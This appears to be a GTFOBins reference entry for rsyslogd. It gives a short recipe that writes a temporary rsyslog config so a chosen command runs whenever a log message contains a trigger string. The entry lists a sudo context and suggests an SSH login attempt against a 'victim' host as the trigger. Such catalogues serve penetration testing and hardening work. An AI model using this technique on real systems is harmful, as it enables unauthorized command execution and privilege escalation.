<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/rsyslogd -->
---
functions:
  command:
  - blind: true
    code: |-
      cat >/path/to/temp-file <<EOF
      module(load="imuxsock")
      :msg, contains, "somerandomstring" ^/path/to/command
      EOF

      rsyslogd -f /path/to/temp-file
    comment: |-
      In order for this to work, one must be able to trigger one event containing the chosen string, e.g., `somerandomstring`. One possibility is to attempt to connect to the victim host via SSH, for example:

      ```
      ssh somerandomstring@victim.com
      ```
    contexts:
      sudo:
...
